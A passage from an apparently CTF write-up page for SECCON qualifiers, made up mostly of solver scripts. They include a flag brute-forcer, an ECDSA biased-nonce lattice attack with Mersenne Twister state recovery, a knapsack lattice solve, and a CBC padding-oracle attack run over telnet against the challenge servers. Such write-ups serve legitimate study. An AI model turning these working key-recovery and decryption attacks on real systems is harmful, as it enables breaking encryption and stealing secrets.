        dst_symbols.update(re.findall(<span class="hljs-string">r&#x27;1[^1]*1&#x27;</span>, dst))
sk = <span class="hljs-built_in">set</span>(src_symbols.keys())
dk = <span class="hljs-built_in">set</span>(dst_symbols.keys())
<span class="hljs-keyword">assert</span> sk == dk
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(sk))
<span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">sorted</span>(sk):
    <span class="hljs-built_in">print</span>(k, src_symbols[k], dst_symbols[k])

sk = <span class="hljs-built_in">sorted</span>(sk)
mapping = {
    <span class="hljs-string">&#x27;1II1&#x27;</span>: <span class="hljs-string">&#x27;S&#x27;</span>,
    <span class="hljs-string">&#x27;1IIIl1&#x27;</span>: <span class="hljs-string">&#x27;X&#x27;</span>,
    <span class="hljs-string">&#x27;1IlIl1&#x27;</span>: <span class="hljs-string">&#x27;A&#x27;</span>,
    <span class="hljs-string">&#x27;1IIll1&#x27;</span>: <span class="hljs-string">&#x27;B&#x27;</span>,
    <span class="hljs-string">&#x27;1IIlI1&#x27;</span>: <span class="hljs-string">&#x27;&lt;&#x27;</span>,
    <span class="hljs-string">&#x27;1l1&#x27;</span>: <span class="hljs-string">&#x27;&gt;&#x27;</span>,
    <span class="hljs-string">&#x27;1IlI1&#x27;</span>: <span class="hljs-string">&#x27;]&#x27;</span>,
}
sk = [e <span class="hljs-keyword">for</span> e <span class="hljs-keyword">in</span> sk <span class="hljs-keyword">if</span> e <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> mapping]
mapping.update({e: <span class="hljs-string">f&#x27;<span class="hljs-subst">{i:x}</span>&#x27;</span> <span class="hljs-keyword">for</span> i, e <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(sk)})
<span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> mapping.items():
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">{v}</span>: <span class="hljs-subst">{k}</span>&#x27;</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sub</span>(<span class="hljs-params">x</span>):</span>
    <span class="hljs-keyword">return</span> mapping[x.group(<span class="hljs-number">0</span>)]
    <span class="hljs-comment"># return f&#x27;&lt;{mapping[x.group(0)]}&gt;&#x27;</span>

<span class="hljs-keyword">for</span> lst <span class="hljs-keyword">in</span> [encode, decode, transition]:
    nxt = []
    <span class="hljs-keyword">for</span> src, dst <span class="hljs-keyword">in</span> lst:
        src = re.sub(<span class="hljs-string">r&#x27;1[^1]*1&#x27;</span>, sub, src)
        dst = re.sub(<span class="hljs-string">r&#x27;1[^1]*1&#x27;</span>, sub, dst)
        nxt.append((src, dst))
    lst.clear()
    lst.extend(nxt)


reject = []
cleanup = []
trans1 = []
trans2 = []
trigger = []

<span class="hljs-keyword">for</span> src, dst <span class="hljs-keyword">in</span> transition:
    <span class="hljs-keyword">if</span> src == <span class="hljs-string">&#x27;&lt;^&gt;&#x27;</span>:
        trigger.append((src, dst))
    <span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;X&#x27;</span> <span class="hljs-keyword">in</span> src:
        cleanup.append((src, dst))
    <span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;X&#x27;</span> <span class="hljs-keyword">in</span> dst:
        reject.append((src, dst))
    <span class="hljs-keyword">elif</span> dst.endswith(<span class="hljs-string">&#x27;S&#x27;</span>) <span class="hljs-keyword">and</span> <span class="hljs-built_in">all</span>(e <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;SAB&#x27;</span> <span class="hljs-keyword">for</span> e <span class="hljs-keyword">in</span> src):
        trans1.append((src, dst))
    <span class="hljs-keyword">else</span>:
        trans2.append((src, dst))

reject = <span class="hljs-built_in">sorted</span>(reject)
trans1 = <span class="hljs-built_in">sorted</span>(trans1)

<span class="hljs-keyword">for</span> lst <span class="hljs-keyword">in</span> [encode, decode, reject, cleanup, trans1, trans2, trigger]:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>)
    <span class="hljs-keyword">for</span> src, dst <span class="hljs-keyword">in</span> lst:
        tag = <span class="hljs-string">&#x27;&#x27;</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">{src:50s}</span> <span class="hljs-subst">{dst:50s}</span> <span class="hljs-subst">{tag}</span>&#x27;</span>)


encode = {src[<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>]: dst <span class="hljs-keyword">for</span> src, dst <span class="hljs-keyword">in</span> encode}
reject = <span class="hljs-built_in">set</span>(src <span class="hljs-keyword">for</span> src, dst <span class="hljs-keyword">in</span> reject)
trans1 = <span class="hljs-built_in">dict</span>(trans1)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">trans</span>(<span class="hljs-params">x</span>):</span>
    x = x.group(<span class="hljs-number">0</span>)
    <span class="hljs-keyword">if</span> x <span class="hljs-keyword">in</span> reject:
        <span class="hljs-keyword">raise</span> EOFError(x)
    <span class="hljs-keyword">return</span> trans1[x]

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">emu</span>(<span class="hljs-params">inp</span>):</span>
    inp = <span class="hljs-string">&#x27;&#x27;</span>.join(encode[e] <span class="hljs-keyword">for</span> e <span class="hljs-keyword">in</span> inp)

    <span class="hljs-keyword">while</span> inp != <span class="hljs-string">&#x27;S&#x27;</span>:
        org = inp
        <span class="hljs-keyword">if</span> re.search(<span class="hljs-string">r&#x27;S[AB]+S[AB]&#x27;</span>, inp) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
            <span class="hljs-keyword">while</span> re.search(<span class="hljs-string">r&#x27;S[AB]+S[AB]&#x27;</span>, inp) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
                <span class="hljs-keyword">try</span>:
                    inp = re.sub(<span class="hljs-string">r&#x27;S[AB]+S[AB]&#x27;</span>, trans, inp)
                <span class="hljs-keyword">except</span> EOFError:
                    <span class="hljs-keyword">return</span> inp

        <span class="hljs-keyword">for</span> src, dst <span class="hljs-keyword">in</span> trans2:
            <span class="hljs-keyword">if</span> src <span class="hljs-keyword">in</span> inp:
                org = inp
                inp = inp.replace(src, dst)
                <span class="hljs-keyword">break</span>
        <span class="hljs-keyword">else</span>:
            <span class="hljs-comment"># print(&#x27;Start&#x27;, inp)</span>
            inp = trigger[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] + inp

possible = <span class="hljs-string">&#x27;023456789ABCDEFGHJKLMNOPQRSTUVWXYZ_abcdefghijkmnopqrstuvwxyz{}&#x27;</span>

prefix = <span class="hljs-string">&#x27;SECCON{&#x27;</span>

<span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm, trange
<span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> trange(<span class="hljs-number">10</span>):
    res = [(<span class="hljs-built_in">len</span>(emu(prefix + e + <span class="hljs-string">&#x27;Z&#x27;</span>*<span class="hljs-number">4</span>)), e) <span class="hljs-keyword">for</span> e <span class="hljs-keyword">in</span> tqdm(possible, leave=<span class="hljs-literal">False</span>)]
    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">sorted</span>(res))
    size, e = <span class="hljs-built_in">min</span>(res)
    prefix += e
    <span class="hljs-built_in">print</span>(size, e, prefix)</code></pre><h2 id="crypto"><a class="header-link" href="#crypto"></a>Crypto</h2>
<h3 id="sign-wars"><a class="header-link" href="#sign-wars"></a>Sign Wars</h3>
<pre class="hljs"><code><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long, long_to_bytes
<span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad
<span class="hljs-keyword">import</span> random
<span class="hljs-keyword">import</span> ast


<span class="hljs-comment"># P-384 Curve</span>
p = <span class="hljs-number">39402006196394479212279040100143613805079739270465446667948293404245721771496870329047266088258938001861606973112319</span>
a = -<span class="hljs-number">3</span>
b = <span class="hljs-number">27580193559959705877849011840389048093056905856361568521428707301988689241309860865136260764883745107765439761230575</span>
curve = EllipticCurve(GF(p), [a, b])
order = <span class="hljs-number">39402006196394479212279040100143613805079739270465446667946905279627659399113263569398956308152294913554433653942643</span>
Z_n = GF(order)
gx = <span class="hljs-number">26247035095799689268623156744566981891852923491109213387815615900925518854738050089022388053975719786650872476732087</span>
gy = <span class="hljs-number">8325710961489029985546751289520108179287853048861315594709205902480503199884419224438643760392947333078086511627871</span>
G = curve(gx, gy)

<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./output.txt&#x27;</span>) <span class="hljs-keyword">as</span> f:
    sig1 = ast.literal_eval(f.readline())
    sig2 = ast.literal_eval(f.readline())


<span class="hljs-comment"># Solve by LLL (biased random)</span>
<span class="hljs-string">&quot;&quot;&quot;
s = (h + rx) / k0
k0 = (k3 * 2^256) + (k1) + (h * 2^128)
k0 = Z + (h * 2^128)
k0 = Z + H
h &lt; 2^128
s = (h + rx) / (Z + H)
Z + H = (h + rx) / s
k3 t256 + k1 + h t128 = h/s + r/s x
k3 t256 + k1 + h (t128 - 1/s) = r/s x


t256         1   0   0
q            0   0   0
r/s          0   1   0
(t128-1/s)   0   0   1

k1           k3  x   h
&quot;&quot;&quot;</span>

q = order
W = <span class="hljs-number">10</span>
L = zero_matrix(ZZ, W*<span class="hljs-number">2</span>+<span class="hljs-number">2</span>, W*<span class="hljs-number">2</span>+<span class="hljs-number">2</span>)

<span class="hljs-keyword">for</span> i, (r,s,*_) <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(sig1[:W]):
    
    t128, t256 = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">128</span>, <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">256</span>
    invs = inverse_mod(s, q)
    <span class="hljs-comment"># assert ((k3 * t256 + k1 + h * t128 - h*invs - r*invs*x) % q) == 0</span>

    u = r * invs % q
    v = (t128 - invs) % q

    off = i*<span class="hljs-number">2</span>
    L[off+<span class="hljs-number">0</span>, off] = ZZ(t256) * <span class="hljs-number">2</span>^<span class="hljs-number">256</span>
    L[off+<span class="hljs-number">1</span>, off] = ZZ(q) * <span class="hljs-number">2</span>^<span class="hljs-number">256</span>
    L[-<span class="hljs-number">2</span>,    off] = ZZ(u) * <span class="hljs-number">2</span>^<span class="hljs-number">256</span>
    L[-<span class="hljs-number">1</span>,    off] = ZZ(v) * <span class="hljs-number">2</span>^<span class="hljs-number">256</span>
    L[off+<span class="hljs-number">0</span>, off+<span class="hljs-number">1</span>] = <span class="hljs-number">1</span> * <span class="hljs-number">2</span>^<span class="hljs-number">256</span>
L[-<span class="hljs-number">2</span>,-<span class="hljs-number">2</span>] = <span class="hljs-number">1</span> * <span class="hljs-number">1</span>
L[-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>] = <span class="hljs-number">1</span> * <span class="hljs-number">2</span>^<span class="hljs-number">256</span>

B = L.LLL()
<span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> B:
    x = <span class="hljs-built_in">abs</span>(row[-<span class="hljs-number">2</span>])
    h = <span class="hljs-built_in">abs</span>(row[-<span class="hljs-number">1</span>])
    <span class="hljs-keyword">if</span> h == <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> h % <span class="hljs-number">2</span>^<span class="hljs-number">256</span> != <span class="hljs-number">0</span>:
        <span class="hljs-keyword">continue</span>
    h = h // <span class="hljs-number">2</span>^<span class="hljs-number">256</span>

    ok = <span class="hljs-literal">True</span>
    <span class="hljs-keyword">for</span> i, (r,s,*_) <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(sig1):
        <span class="hljs-comment"># s = (h + rx) / k</span>
        kk = <span class="hljs-built_in">int</span>((h + r*x) * inverse_mod(s, q) % q)
        hh = (kk &gt;&gt; <span class="hljs-number">128</span>) &amp; ((<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">128</span>) - <span class="hljs-number">1</span>)
        <span class="hljs-keyword">if</span> hh != h:
            ok = <span class="hljs-literal">False</span>
            <span class="hljs-keyword">break</span>
    <span class="hljs-keyword">if</span> ok:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Found&#x27;</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;x = <span class="hljs-subst">{x}</span>&#x27;</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;h = <span class="hljs-subst">{h}</span>&#x27;</span>)
        <span class="hljs-keyword">break</span>
<span class="hljs-built_in">print</span>(long_to_bytes(x))


<span class="hljs-comment"># Solve by reconstructing PRNG</span>
<span class="hljs-keyword">from</span> mt <span class="hljs-keyword">import</span> MT19937, tobin, untamper, tamper

mt = MT19937()
remain = <span class="hljs-literal">None</span>

<span class="hljs-keyword">for</span> i, (r,s,*_) <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(sig1):
    <span class="hljs-comment"># s = (h + rx) / k</span>
    kk = <span class="hljs-built_in">int</span>((h + r*x) * inverse_mod(s, q) % q)
    k1 = (kk &gt;&gt;   <span class="hljs-number">0</span>) &amp; ((<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">128</span>) - <span class="hljs-number">1</span>)
    k2 = (kk &gt;&gt; <span class="hljs-number">128</span>) &amp; ((<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">128</span>) - <span class="hljs-number">1</span>)
    k3 = (kk &gt;&gt; <span class="hljs-number">256</span>) &amp; ((<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">128</span>) - <span class="hljs-number">1</span>)
    <span class="hljs-keyword">assert</span> k2 == h

    <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> tobin(k1, n=<span class="hljs-number">128</span>):
        remain = mt.add(b)
    <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> tobin(k3, n=<span class="hljs-number">128</span>):
        remain = mt.add(b)

<span class="hljs-keyword">assert</span> remain == <span class="hljs-number">0</span>
rec = mt.reconstruct(<span class="hljs-string">&#x27;python&#x27;</span>)

M = []
v = []
<span class="hljs-keyword">for</span> i, (r,s,*_) <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(sig2):
    <span class="hljs-comment"># print(k == rec.getrandbits(384))</span>
    k = rec.getrandbits(<span class="hljs-number">384</span>)
    <span class="hljs-comment"># s = (z2 + r*d) / k</span>
    <span class="hljs-comment"># s*k = z2 + r*d</span>
    M.append([<span class="hljs-number">1</span>, r])
    v.append(s*k % q)
M = Matrix(Z_n, M)
v = vector(Z_n, v)
<span class="hljs-built_in">print</span>(long_to_bytes(x) + long_to_bytes(M.solve_right(v)[<span class="hljs-number">1</span>]))</code></pre><h3 id="oooooo"><a class="header-link" href="#oooooo"></a>oOoOoO</h3>
<pre class="hljs"><code><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes, bytes_to_long, getPrime
<span class="hljs-keyword">import</span> random
<span class="hljs-keyword">from</span> telnetlib <span class="hljs-keyword">import</span> Telnet

conn = Telnet(<span class="hljs-string">&#x27;oooooo.quals.seccon.jp&#x27;</span>, <span class="hljs-built_in">int</span>(<span class="hljs-number">8000</span>))
p = <span class="hljs-built_in">int</span>(conn.read_until(<span class="hljs-string">b&#x27;\n&#x27;</span>)[<span class="hljs-number">4</span>:])
S = <span class="hljs-built_in">int</span>(conn.read_until(<span class="hljs-string">b&#x27;\n&#x27;</span>)[<span class="hljs-number">4</span>:])

N = <span class="hljs-number">128</span>
<span class="hljs-comment"># N = 4</span>
message = <span class="hljs-string">b&quot;&quot;</span>
v = []
<span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N):
    r = random.getrandbits(<span class="hljs-number">1</span>)
    message += <span class="hljs-string">b&quot;o&quot;</span> <span class="hljs-keyword">if</span> r == <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-string">b&quot;O&quot;</span>
    v.append(r)
<span class="hljs-built_in">print</span>(message)

<span class="hljs-comment"># p = getPrime(len(message) * 5)</span>
<span class="hljs-comment"># S = bytes_to_long(message) % p</span>
T = (S - bytes_to_long(<span class="hljs-string">b&#x27;O&#x27;</span> * N)) % p

M = []
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N):
    m = <span class="hljs-string">b&#x27; &#x27;</span>.rjust(i+<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>).ljust(N, <span class="hljs-string">b&#x27;\0&#x27;</span>)
    m = bytes_to_long(m) % p
    M.append(m)

<span class="hljs-comment"># print(p)</span>
<span class="hljs-comment"># print(T)</span>
<span class="hljs-comment"># print(Matrix(Zmod(p), M) * vector(Zmod(p), v))</span>
<span class="hljs-comment"># print(S)</span>

M.extend([-T, p])
L = identity_matrix(<span class="hljs-built_in">len</span>(M))
L[:, -<span class="hljs-number">1</span>] = Matrix(ZZ, M).T
B = L.BKZ()

ans = B[<span class="hljs-number">0</span>]
<span class="hljs-keyword">assert</span> ans[-<span class="hljs-number">1</span>] == <span class="hljs-number">0</span>
<span class="hljs-keyword">if</span> ans[-<span class="hljs-number">2</span>] &lt; <span class="hljs-number">0</span>:
    ans = -ans

<span class="hljs-keyword">assert</span> <span class="hljs-built_in">all</span>(<span class="hljs-number">0</span> &lt;= e &lt;= <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> e <span class="hljs-keyword">in</span> ans)
<span class="hljs-built_in">print</span>(ans[:-<span class="hljs-number">2</span>] == vector(v))

msg = <span class="hljs-string">b&#x27;&#x27;</span>.join(<span class="hljs-string">b&#x27;o&#x27;</span> <span class="hljs-keyword">if</span> e <span class="hljs-keyword">else</span> <span class="hljs-string">b&#x27;O&#x27;</span> <span class="hljs-keyword">for</span> e <span class="hljs-keyword">in</span> ans[:-<span class="hljs-number">2</span>])
<span class="hljs-built_in">print</span>(msg)
conn.write(msg + <span class="hljs-string">b&#x27;\n&#x27;</span>)
conn.interact()
conn.close()</code></pre><h3 id="cerberus"><a class="header-link" href="#cerberus"></a>cerberus</h3>
<pre class="hljs"><code><span class="hljs-keyword">import</span> base64
<span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad, unpad
<span class="hljs-keyword">from</span> Crypto.Util.strxor <span class="hljs-keyword">import</span> strxor
<span class="hljs-keyword">import</span> signal

<span class="hljs-keyword">from</span> telnetlib <span class="hljs-keyword">import</span> Telnet

conn = Telnet(<span class="hljs-string">&#x27;cerberus.quals.seccon.jp&#x27;</span>, <span class="hljs-built_in">int</span>(<span class="hljs-number">8080</span>))
conn.read_until(<span class="hljs-string">b&#x27;\n&#x27;</span>)
spell = conn.read_until(<span class="hljs-string">b&#x27;\n&#x27;</span>)
c = base64.b64decode(spell)
ref_iv, ref_c = c[:<span class="hljs-number">16</span>], c[<span class="hljs-number">16</span>:]

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">oracle</span>(<span class="hljs-params">ivs, c</span>):</span>
    <span class="hljs-keyword">for</span> iv <span class="hljs-keyword">in</span> ivs:
        conn.write(base64.b64encode(iv+c).replace(<span class="hljs-string">b&#x27;\n&#x27;</span>, <span class="hljs-string">b&#x27;&#x27;</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span>)
    res = []
    conn.read_until(<span class="hljs-string">b&#x27;spell:&#x27;</span>)
    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> ivs:
        res.append(conn.read_until(<span class="hljs-string">b&#x27;\n&#x27;</span>).endswith(<span class="hljs-string">b&#x27;:)\n&#x27;</span>))
    <span class="hljs-keyword">return</span> res

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">block_oracle</span>(<span class="hljs-params">iv0, prefix, block, prev=<span class="hljs-string">b&#x27;\0&#x27;</span>*<span class="hljs-number">16</span></span>):</span>
    plain = <span class="hljs-built_in">bytearray</span>(<span class="hljs-string">b&#x27;\0&#x27;</span> * <span class="hljs-number">16</span>)
    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):
        iv = strxor(iv0, plain)
        iv = strxor(iv, pad(<span class="hljs-string">b&#x27;\0&#x27;</span>*p, <span class="hljs-number">16</span>))
        m = <span class="hljs-built_in">bytearray</span>(<span class="hljs-string">b&#x27;\0&#x27;</span> * <span class="hljs-number">16</span>)
        ivs = []
        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):
            m[p] = c
            ivs.append(strxor(iv, m))
        res = oracle(ivs, prefix+block)
        <span class="hljs-keyword">assert</span> <span class="hljs-built_in">sum</span>(res) == <span class="hljs-number">1</span>, <span class="hljs-built_in">sum</span>(res)
        plain[p] = <span class="hljs-built_in">next</span>(<span class="hljs-built_in">iter</span>(i <span class="hljs-keyword">for</span> i, e <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(res) <span class="hljs-keyword">if</span> e))
        <span class="hljs-built_in">print</span>(strxor(plain, prev))
    <span class="hljs-keyword">return</span> strxor(plain, prev)

b0 = <span class="hljs-string">b&#x27;\0&#x27;</span> * <span class="hljs-number">16</span>
p0 = block_oracle(ref_iv, ref_c, b0)

prev = strxor(p0, ref_iv)
pfix = ref_c + b0
flag = <span class="hljs-string">b&#x27;&#x27;</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(ref_c), <span class="hljs-number">16</span>):
    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n&#x27;</span> + <span class="hljs-string">&#x27;=&#x27;</span>*<span class="hljs-number">10</span>, i, <span class="hljs-string">&#x27;=&#x27;</span>*<span class="hljs-number">10</span>)
    p = block_oracle(ref_iv, pfix, ref_c[i:i+<span class="hljs-number">16</span>], prev)
    prev = strxor(p0, strxor(p, ref_c[i:i+<span class="hljs-number">16</span>]))
    flag += p
    <span class="hljs-built_in">print</span>(flag)</code></pre><h3 id="xxx"><a class="header-link" href="#xxx"></a>XXX</h3>
<pre class="hljs"><code><span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> ast


<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./output.txt&#x27;</span>) <span class="hljs-keyword">as</span> f:
    p = ast.literal_eval(f.readline())
    params = ast.literal_eval(f.readline())
    
Fp = GF(p)

<span class="hljs-string">&quot;&quot;&quot;
b1 - b2 = y1^2 - y2^2 - (a1-a2) * x

b1-b2 b1-b3 1 0
a1-a2 a1-a3 0 1
p     0     0 0
0     p     0 0

ydiff ydiff x
&quot;&quot;&quot;</span>

alpha = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-built_in">int</span>(<span class="hljs-built_in">int</span>(p).bit_length() / <span class="hljs-number">2.5</span>)

bds, ads, yds, mul = [], [], [], [<span class="hljs-number">1</span>, x]
<span class="hljs-keyword">for</span> a1, b1, *_ <span class="hljs-keyword">in</span> params[:<span class="hljs-number">1</span>]:
    <span class="hljs-keyword">for</span> a2, b2, *_ <span class="hljs-keyword">in</span> params:
        bdiff, adiff = (b1-b2)%p, (a1-a2)%p
        <span class="hljs-keyword">if</span> bdiff == <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> adiff == <span class="hljs-number">0</span>:
            <span class="hljs-keyword">continue</span>
        bds.append(bdiff)
        ads.append(adiff)
        

L = zero_matrix(ZZ, <span class="hljs-built_in">len</span>(bds)+<span class="hljs-number">2</span>, <span class="hljs-built_in">len</span>(bds)+<span class="hljs-number">2</span>)
L[<span class="hljs-number">0</span>,:-<span class="hljs-number">2</span>] = Matrix(ZZ, bds)
L[<span class="hljs-number">1</span>,:-<span class="hljs-number">2</span>] = Matrix(ZZ, ads)
L[<span class="hljs-number">2</span>:,:-<span class="hljs-number">2</span>] = identity_matrix(ZZ, <span class="hljs-built_in">len</span>(bds)) * p
L[<span class="hljs-number">0</span>, -<span class="hljs-number">2</span>] = alpha^<span class="hljs-number">2</span>
L[<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>] = alpha

B = L.LLL()
ans = B[<span class="hljs-number">0</span>]
<span class="hljs-keyword">if</span> ans[-<span class="hljs-number">1</span>] &lt; <span class="hljs-number">0</span>:
    ans = -ans
<span class="hljs-keyword">assert</span> ans[-<span class="hljs-number">2</span>] == alpha^<span class="hljs-number">2</span>
<span class="hljs-keyword">assert</span> ans[-<span class="hljs-number">1</span>] % alpha == <span class="hljs-number">0</span>
x = ans[-<span class="hljs-number">1</span>] // alpha
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">int</span>(x).to_bytes(<span class="hljs-number">128</span>, <span class="hljs-string">&#x27;big&#x27;</span>))</code></pre><h2 id="misc"><a class="header-link" href="#misc"></a>Misc</h2>
        </article>
      </div>
    </div>
  </body>
</html>
